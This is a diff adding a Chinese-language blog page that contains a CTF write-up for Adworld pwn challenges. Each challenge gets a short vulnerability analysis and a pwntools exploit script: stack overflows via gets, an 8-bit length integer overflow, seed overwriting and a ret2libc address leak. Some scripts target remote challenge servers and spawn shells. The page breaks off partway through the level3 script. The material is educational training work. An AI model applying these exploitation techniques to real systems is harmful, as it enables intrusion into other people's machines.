@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/blog/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/blog/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/blog/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/blog/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/blog/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/blog/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="攻防世界,Adworld,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="pwnlevel2IDA分析很明显的溢出，而且还调用了system，看汇编。拿到call_system的地址，然后shift+f12也找到了bin_sh。脚本 12345678910111213from pwn import *r = process(&quot;level2&quot;)#r = remote(&quot;159.138.137.79&quot;, 63180)context(log_level=&quot;debug&quot;, ar">
+<meta name="keywords" content="攻防世界,Adworld">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界CTF-WriteUp">
+<meta property="og:url" content="http://yoursite.com/2020/04/25/攻防世界CTF-WriteUp/index.html">
+<meta property="og:site_name" content="Sncker&#39;s blog - qq948375961">
+<meta property="og:description" content="pwnlevel2IDA分析很明显的溢出，而且还调用了system，看汇编。拿到call_system的地址，然后shift+f12也找到了bin_sh。脚本 12345678910111213from pwn import *r = process(&quot;level2&quot;)#r = remote(&quot;159.138.137.79&quot;, 63180)context(log_level=&quot;debug&quot;, ar">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425185019.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425185138.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425185155.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425185409.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425185541.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425185947.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425191430.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425192101.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425192400.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425192432.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425192507.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425194729.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425195016.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425195205.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425195238.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425195404.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425195854.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425200119.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425200651.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425200715.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425200937.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425200957.png">
+<meta property="og:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425201254.png">
+<meta property="og:updated_time" content="2020-04-25T12:29:33.925Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="攻防世界CTF-WriteUp">
+<meta name="twitter:description" content="pwnlevel2IDA分析很明显的溢出，而且还调用了system，看汇编。拿到call_system的地址，然后shift+f12也找到了bin_sh。脚本 12345678910111213from pwn import *r = process(&quot;level2&quot;)#r = remote(&quot;159.138.137.79&quot;, 63180)context(log_level=&quot;debug&quot;, ar">
+<meta name="twitter:image" content="https://gitee.com/sncker/resource/raw/master/image/20200425185019.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/blog/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/25/攻防世界CTF-WriteUp/">
+
+
+
+
+
+  <title>攻防世界CTF-WriteUp | Sncker's blog - qq948375961</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/blog/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sncker's blog - qq948375961</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">情绪不稳定，要做就做大事情。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/blog/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/blog/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/blog/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/2020/04/25/攻防世界CTF-WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="SNCKER">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="http://q1.qlogo.cn/g?b=qq&nk=948375961&s=640">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sncker's blog - qq948375961">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">攻防世界CTF-WriteUp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-25T18:44:00+08:00">
+                2020-04-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog/categories/CTF/WriteUp/" itemprop="url" rel="index">
+                    <span itemprop="name">WriteUp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185019.png" alt><br>IDA分析<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185138.png" alt><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185155.png" alt><br>很明显的溢出，而且还调用了system，看汇编。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185409.png" alt><br>拿到call_system的地址，然后shift+f12也找到了bin_sh。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185541.png" alt><br>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"level2"</span>)</span><br><span class="line"><span class="comment">#r = remote("159.138.137.79", 63180)</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"i386"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line">call_system_addr = <span class="number">0x0804845C</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(call_system_addr) + p32(bin_sh_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185947.png" alt><br>保护全开了，IDA分析。<br>main反汇编  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">stderr</span>;</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0(v3, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your name:"</span>);</span><br><span class="line">  gets(&amp;v8);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------Turn:%d-------------\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"---------------------------------"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"GG!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>sub_C3E()是cat flag的。<br>这题就是生成随机数，然后用户猜，猜对10次就可以了。<br>学过C都知道rand()是伪随机数，只要能控制随机数种子，那么随机数就能预测。   </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v8; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Your name:"</span>);</span><br><span class="line">gets(&amp;v8);</span><br></pre></td></tr></table></figure>
+
+<p>名字输入处用了gets函数，因此可以溢出。看局部变量声明顺序，名字变量填充0x20字节即可溢出覆盖到种子变量seed。<br>用ldd命令查看程序链接库路径。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425191430.png" alt><br>然后固定一个种子值，边调用libc的rand()生成随机数边发送即可。（若远端库版本不一样，虽然固定种子值，但生成的随机数也可能不一样，所以打pwn要尽可能地模拟出和远端一样的环境）<br>脚本  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">so = CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("guess_num")</span></span><br><span class="line">r = remote(<span class="string">"159.138.137.79"</span>, <span class="number">59240</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Your name:"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">so.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    r.recvuntil(<span class="string">"number:"</span>)</span><br><span class="line">    r.sendline(str(so.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192101.png" alt><br>main函数<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192400.png" alt><br>跟进login函数<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192432.png" alt><br>再跟进check_passwd函数<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192507.png" alt><br>check_passwd对传入的字符串进行判断，只要长度在[4,8]之间就会将字符串复制到dest变量。<br>这里很明显，密码字符串的buf长度远大于dest变量，因此可以造成溢出。<br>然后考虑的就是绕过长度限制，v3是字符串长度，它是无符号8位整型，数值范围是0~255，结合题目名字可以知道当v3大于255的时候就会溢出，比如256就会溢出成0,那么[260,264]就可以溢出到[4,8]这个区间。应该不难理解。  </p>
+<p>|7|6|5|4|3|2|1|0|十进制<br>:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:<br>|1|1|1|1|1|1|1|1|255<br>1|0|0|0|0|0|0|0|0|256</p>
+<p>8位无符号整型，有效位0~7，溢出后就为0了。<br>绕过了长度问题，就要想溢出后要劫持程序流到哪。<br>仔细找找还漏了一个cat flag的函数。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425194729.png" alt><br>直接跳上去就可以了。<br>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("int_overflow")</span></span><br><span class="line">r = remote(<span class="string">"159.138.137.79"</span>, <span class="number">60855</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"i386"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line">cat_flag_addr = <span class="number">0x0804868B</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Please input your username:"</span>, <span class="string">"sncker"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p32(cat_flag_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">260</span>, <span class="string">'a'</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425195016.png" alt><br>直接贴关键函数。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425195205.png" alt><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425195238.png" alt><br>看着hello函数一堆乱起八糟的东西，直接跑一下程序。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425195404.png" alt><br>估计是干扰的。去掉这些干扰的代码，剩下的思路就比较清晰。gets可以溢出了，pwn函数里有call_system的地址。shift+12找bin_sh没找到。仔细看一下发现name是全局变量，那么直接写bin_sh进去就可以了。<br>脚本  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("cgpwn2")</span></span><br><span class="line">r = remote(<span class="string">"159.138.137.79"</span>, <span class="number">51100</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"i386"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line">call_system_addr = <span class="number">0x0804855A</span></span><br><span class="line">p_name = <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"name"</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"here:"</span>, <span class="string">'a'</span>*<span class="number">0x26</span> + <span class="string">'a'</span>*<span class="number">0x4</span> + p32(call_system_addr) + p32(p_name))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425195854.png" alt><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425200119.png" alt><br>很清晰的思路，先让v5不等于1926再让v5等于1926，gets的v4可以覆盖到v5。<br>脚本  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("when_did_you_born")</span></span><br><span class="line">r = remote(<span class="string">"159.138.137.79"</span>, <span class="number">62561</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"Birth?"</span>, <span class="string">"1999"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Name?"</span>, <span class="string">'a'</span>*<span class="number">0x8</span> + p64(<span class="number">1926</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425200651.png" alt><br>又是简单的覆盖。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425200715.png" alt><br>相差4直接填充。  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("hello_pwn")</span></span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>, <span class="number">45068</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> + p64(<span class="number">1853186401</span>)</span><br><span class="line">r.sendafter(<span class="string">"for bof"</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425200937.png" alt><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425200957.png" alt><br>简单的溢出，平台放题顺序有点问题啊。  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("level0")</span></span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>, <span class="number">39454</span>)</span><br><span class="line"></span><br><span class="line">callsystem_addr = <span class="number">0x0000000000400596</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(callsystem_addr)</span><br><span class="line">r.sendafter(<span class="string">"World"</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这题给了libc文件，终于要ret2libc了。。。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425201254.png" alt><br>虽然有溢出，但是程序里没用system和binsh字符串，只能跳到libc。<br>那么就需要泄露一些库函数的地址，来计算出libc的基址。泄露可以用printf和write这类函数来泄露。这里可以看到在read之前，程序调用过一次write，那么got表里是有write的地址的。所以可以调用write来泄露write的真实地址。  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vul_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8C</span> + p32(write_plt) + p32(vul_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>解释一下payload：跳到write@plt调用write，压入vul_addr作为返回地址，将wirte@got的地址写出四个字节(32位)到标准输出。<br>再次跳回vulnerable_function后就是简单的ret2libc了。<br>完整代码  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"level3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc_32.so.6"</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span 